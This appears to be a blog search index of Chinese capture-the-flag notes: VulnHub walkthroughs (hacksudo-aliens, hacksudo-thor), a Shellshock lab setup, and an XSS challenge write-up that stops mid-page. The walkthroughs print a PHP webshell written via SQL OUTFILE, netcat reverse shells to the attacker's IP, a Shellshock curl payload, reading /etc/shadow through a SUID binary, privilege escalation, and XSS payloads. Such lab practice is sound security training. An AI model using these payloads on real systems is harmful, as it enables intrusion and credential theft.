<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>hacksudo fog</title>
    <url>/note//hacksudo-fog.html</url>
    <content><![CDATA[
]]></content>
  </entry>
  <entry>
    <title>hacksudo-aliens</title>
    <url>/note//hacksudo-aliens.html</url>
    <content><![CDATA[<h2 id="靶机来源">靶机来源</h2>
<p><strong>vulnhub</strong>:<strong><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></strong></p>
<span id="more"></span>
<h2 id="安装">安装</h2>
<p>下载后导入虚拟机即可</p>
<h2 id="攻击">攻击</h2>
<p><img src="/note/hacksudo-aliens/1.png"></p>
<p>可以发现<strong>80</strong>和<strong>9000</strong>端口分别有一个http服务，浏览器访问一下</p>
<p><img src="/note/hacksudo-aliens/2.png"></p>
<p><strong>9000</strong>端口是一个<strong>phpMyAdmin</strong>，不过我们没有账号和密码，暂且放过。</p>
<p>对<strong>80</strong>端口进行扫描（这里用的是dirsearch）</p>
<p>主要结果如下</p>
<p><img src="/note/hacksudo-aliens/3.png"></p>
<p>发现如下目录</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.0.103/backup/</span><br></pre></td></tr></table></figure>
<p>浏览器访问一下</p>
<p><img src="/note/hacksudo-aliens/4.png"></p>
<p>发现一个可列出的目录，里面有一个文件，下载到本地后查看</p>
<p><img src="/note/hacksudo-aliens/5.png"></p>
<p>可以看到里面有一组账号和密码</p>
<p><strong>22</strong>端口连接<strong>ssh</strong>失败了，不过可以成功登录<strong>9000</strong>端口的<strong>PHPMyAdmain</strong></p>
<p><img src="/note/hacksudo-aliens/6.png"></p>
<p>在<strong>PHPMyAdmain</strong>中查找变量<strong>secure_file_priv</strong></p>
<p><img src="/note/hacksudo-aliens/7.png"></p>
<p>可以看到这是一个空值，这意味这我们可以写入文件</p>
<p>执行如下命令来写入<strong>php</strong>的一句话木马</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;nc&#x27;]); &gt;&quot; <span class="keyword">into</span> outfile &quot;/var/www/html/cmds.php&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>“/var/www/html/“是linux服务器的的默认目录,一句话木马要写入到一个可供浏览器访问的位置</p>
</blockquote>
<p>确认一句话木马可以正常工作后，尝试使用nc建立<strong>shell</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.103/cmds.php?nc=nc -e /bin/bash 192.168.0.106 4888</span><br></pre></td></tr></table></figure>
<p>本地监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4888</span><br></pre></td></tr></table></figure>
<blockquote>
<p>目标机上如果没有nc就用其他的，网上查</p>
</blockquote>
<p><img src="/note/hacksudo-aliens/8.png"></p>
<p>这里有一个<strong>game.html</strong>,之前没发现，浏览器访问一下</p>
<p><img src="/note/hacksudo-aliens/9.png"></p>
<p>代码审计并没有发现什么东西，可能只是一个彩蛋，过。</p>
<p>查找一下是否有可以用来提权的<strong>suid</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<blockquote>
<p>好像有几种不同的写法，自己查</p>
</blockquote>
<p><img src="/note/hacksudo-aliens/10.png"></p>
<p>如下是<strong>date</strong>的<strong>man</strong>文档</p>
<figure>
<img src="/note/hacksudo-aliens/11.png" alt="10"><figcaption aria-hidden="true">10</figcaption>
</figure>
<p>可以看到<strong>date</strong>的<strong>-f</strong>是可以用来读取文件的,这意味着我们可以以root身份读取系统文件(比如/etc/shadow)</p>
<blockquote>
<p>这个用法可能并不常用，<strong>tldr</strong>中并没有找到这个用法</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">date -f /etc/shadow</span><br></pre></td></tr></table></figure>
<p><img src="/note/hacksudo-aliens/12.png"></p>
<p>保存到本地，进行密码爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john -show 1.hash</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里用<strong>hashcat</strong>没爆出来，可能是我用法的问题</p>
</blockquote>
<p><img src="/note/hacksudo-aliens/13.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/script -qc /bin/bash /dev/null</span><br></pre></td></tr></table></figure>
<p><img src="/note/hacksudo-aliens/14.png"></p>
<p>直接<strong>su root</strong>失败了，可能是不允许<strong>root</strong>登录？</p>
<p>退而求其次直接<strong>su hacksudo</strong>，这次到是没问题了.这个靶机有图形化环境，所以不用白不用。</p>
<blockquote>
<p>获得<strong>hacksudo</strong>的密码后其实就可以使用<strong>ssh</strong>登录了，后面的步骤大同小异</p>
</blockquote>
<p>在<strong>/home/hacksudo/alien51</strong>目录下发现一个彩蛋</p>
<p><img src="/note/hacksudo-aliens/15.png"></p>
<p>顺带拿到<strong>hacksudo</strong>的<strong>flag</strong>，在<strong>/home/hacksudo/Desktop</strong>目录下</p>
<p><img src="/note/hacksudo-aliens/16.png"></p>
<p>现在考虑提权为<strong>root</strong>。查看<strong>root</strong>的<strong>bash</strong>历史</p>
<p><img src="/note/hacksudo-aliens/17.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod u=s /home/hacksudo/Download/cpulimit</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>u=s</strong>文件运行时会以其属主权限运行，而这个文件刚好属于root</p>
</blockquote>
<p><img src="/note/hacksudo-aliens/18.png"></p>
<p>只要我们通过这个程序运行bash就可以得到root权限，如下</p>
<p><img src="/note/hacksudo-aliens/19.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>vulunb</tag>
      </tags>
  </entry>
  <entry>
    <title>shellshock</title>
    <url>/note//shellshock.html</url>
    <content><![CDATA[<h2 id="安装">安装</h2>
<p>首先把<strong>vulunb</strong>下载到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git ~/vulhub</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>然后安装个<strong>docker</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
<p>然后安装<strong>docker-compose</strong></p>
<p><img src="/note/shellshock/1.png"></p>
<p>软件源里有就用源里的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt insatll docker-compose</span><br></pre></td></tr></table></figure>
<p>软件源里没有就用<strong>pip</strong>安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip3 install docker-compose</span><br></pre></td></tr></table></figure>
<p>装好之后进入<strong>shellshock</strong>目录执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>-d</strong>表示后台运行</p>
</blockquote>
<p>关闭环境时执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker-compose down</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>cve复现</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo -thor</title>
    <url>/note//hacksudo-thor.html</url>
    <content><![CDATA[<h2 id="靶机来源">靶机来源</h2>
<p><strong>vulnhub</strong>:<strong><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></strong></p>
<span id="more"></span>
<h2 id="安装">安装</h2>
<p>下载后导入虚拟机即可</p>
<h2 id="攻击">攻击</h2>
<p>首先进行端口扫描</p>
<p><img src="/note/hacksudo-thor/1.png"></p>
<p>尝试登录<strong>ssh</strong>，无密码，过</p>
<p>目录扫描并未发现什么东西，直接浏览器访问<strong>80</strong>端口</p>
<p><img src="/note/hacksudo-thor/4.png"></p>
<p>一个类似登录的页面,尝试注入，失败</p>
<p>于是查看页面源码搞代码审计，看到这个（不重要）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- The Easter Egg Modal --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;eEgg_modal&quot;</span> <span class="attr">class</span>=<span class="string">&quot;modal-eEgg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal-content-eEgg&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;caption&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border-radius: 5px 5px 0 0;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span>&gt;</span>They float,&#x27; it growled, &#x27;they float, Georgie, and when</span><br><span class="line">                    you’re down here with me, you’ll float, too–&#x27;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;eEgg_image&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/images/pennywise.jpg&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;caption&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border-radius: 0 0 5px 5px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;&quot;</span>&gt;</span>Going back in 20s...<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> old_time = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> count = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> eEgg_flag = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> modal = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;eEgg_modal&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> footer = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;footer&#x27;</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">eEgg_func</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> n = d.getTime();</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> new_time = <span class="built_in">Math</span>.ceil(n/<span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> ((new_time - old_time) &lt;= <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">        count++;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        count = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    old_time = new_time;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (count &gt; <span class="number">7</span> &amp;&amp; !eEgg_flag) &#123;</span></span><br><span class="line"><span class="javascript">        modal.style.display = <span class="string">&quot;block&quot;</span>;</span></span><br><span class="line"><span class="javascript">        eEgg_flag = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// Timeout</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            modal.style.display = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="javascript">        &#125;, <span class="number">21000</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//Timeout text display in the footer</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> countDownDate = now + <span class="number">21000</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// Get todays date and time</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">          <span class="comment">// Find the distance between now an the count down date</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> distance = countDownDate - now;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">          <span class="comment">// Time calculations for seconds</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> seconds = <span class="built_in">Math</span>.floor((distance % (<span class="number">1000</span> * <span class="number">60</span>)) / <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">          <span class="comment">// Display the result in the element with id=&quot;demo&quot;</span></span></span><br><span class="line"><span class="javascript">          <span class="built_in">document</span>.getElementById(<span class="string">&quot;footer&quot;</span>).innerHTML =</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;Going back in &quot;</span>+ seconds + <span class="string">&quot;s...&quot;</span>;</span></span><br><span class="line"><span class="javascript">        &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>看起来是个彩蛋，要在短时间内多次触发<strong>eEgg_func()</strong>,<strong>ctrl+f</strong>查找该函数，发现其绑定在一张图片的<strong>onclick</strong>属性上</p>
<p><img src="/note/hacksudo-thor/5.png"></p>
<blockquote>
<p>点它就完了</p>
</blockquote>
<p><img src="/note/hacksudo-thor/6.png"></p>
<p>触发成功</p>
<blockquote>
<p>这段话出自<strong>史蒂芬·金 《它》</strong>，原文较长，故不辑录。</p>
</blockquote>
<p>代码审计的另一个发现</p>
<p><img src="/note/hacksudo-thor/7.png"></p>
<p>对<strong>cgi-bin</strong>目录进行扫描</p>
<p><img src="/note/hacksudo-thor/3.png"></p>
<p>猜测其存在<strong>shellshock</strong>漏洞</p>
<p><img src="/note/hacksudo-thor/8.png"></p>
<p>漏洞确实存在</p>
<p><img src="/note/hacksudo-thor/9.png"></p>
<p>确认<strong>nc</strong>是否存在</p>
<p>建立反弹<strong>shell</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -A <span class="string">&quot;() &#123; :; &#125;; echo; /bin/nc -e /bin/bash 192.168.0.108 4888&quot;</span> 192.168.0.109/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure>
<p>本地监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4888</span><br></pre></td></tr></table></figure>
<p><img src="/note/hacksudo-thor/10.png"></p>
<p>提升至半终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>cd</strong>到网站目录并查看文件</p>
<p><img src="/note/hacksudo-thor/11.png"></p>
<p>发现一组账号密码,待用</p>
<p><img src="/note/hacksudo-thor/12.png"></p>
<p>同时在<strong>net_banking.sql</strong>文件中发现多组账号密码</p>
<p><img src="/note/hacksudo-thor/13.png"></p>
<blockquote>
<p>命令行看文件太累了，下载到本地在研究</p>
</blockquote>
<p>默认的 <strong>admin</strong>账号无法登录，在 <strong>customer</strong>中随便选取一个账号登录</p>
<p>登陆成功</p>
<p><img src="/note/hacksudo-thor/14.png"></p>
<blockquote>
<p>然而并没有什么卵用</p>
</blockquote>
<p>查看用户可执行的程序</p>
<p><img src="/note/hacksudo-thor/15.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure>
<p>这个脚本貌似可以让我们以 <strong>thor</strong>的身份执行命令</p>
<p>so</p>
<p><img src="/note/hacksudo-thor/16.png"></p>
<blockquote>
<p>得到thor的权限</p>
</blockquote>
<p>查看 <strong>thor</strong>可执行的程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="/note/hacksudo-thor/17.png"></p>
<p>通过 <strong>service</strong>启动<strong>bash</strong>来获取 <strong>root</strong>权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service ../../bin/bash</span><br></pre></td></tr></table></figure>
<blockquote>
<p>下图是<strong>root</strong>目录下某文件</p>
</blockquote>
<p><img src="/note/hacksudo-thor/18.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>vulunb</tag>
      </tags>
  </entry>
  <entry>
    <title>xssaq通关记录</title>
    <url>/note//xss.html</url>
    <content><![CDATA[<p><strong>靶场环境:</strong> https://xssaq.com/yx/</p>
<h2 id="level-0">Level 0</h2>
<span id="more"></span>
<p><img src="/note/xss/0-1.png"></p>
<p>点击图片即可进Level 1</p>
<h2 id="level-1">Level 1</h2>
<p><img src="/note/xss/1-1.png"></p>
<p>右键查看源码可得</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;     </span></span><br><span class="line"><span class="javascript">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎用户test<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:4<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>由js部分可发现作者对alert函数进行了重定义,当该函数被触发时会触发一个弹窗并跳转到下一关,因此游戏的目标就是通过注入来触发alert函数</p>
<p>从此关的url可以发现<strong>name</strong>的参数会显示在页面中 <img src="/note/xss/1-2.png"> 因此尝试构造payload <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://xssaq.com/yx/level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure> 过关!</p>
<h2 id="level-2">Level 2</h2>
<p><img src="/note/xss/2-1.png"></p>
<p>在输入框中提交上一关payload后并未出现弹窗.右键查看源码,结果如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;     </span></span><br><span class="line"><span class="javascript">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert()<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:24<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure> 可以发现本关对'&lt;&gt;'进行了过滤,替换为其实体字符. 但在下方所示位置并未进行过滤 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure> 尝试将此行构造为 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure> 所以payload为 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure> 提交,过关</p>
<h2 id="level-3">Level 3</h2>
<p><img src="/note/xss/3-1.png"></p>
<p>提交上一关的payload,右键查看源码.结果如下 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;     </span></span><br><span class="line"><span class="javascript">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert()<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level3.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert()<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">搜索</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level3.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span 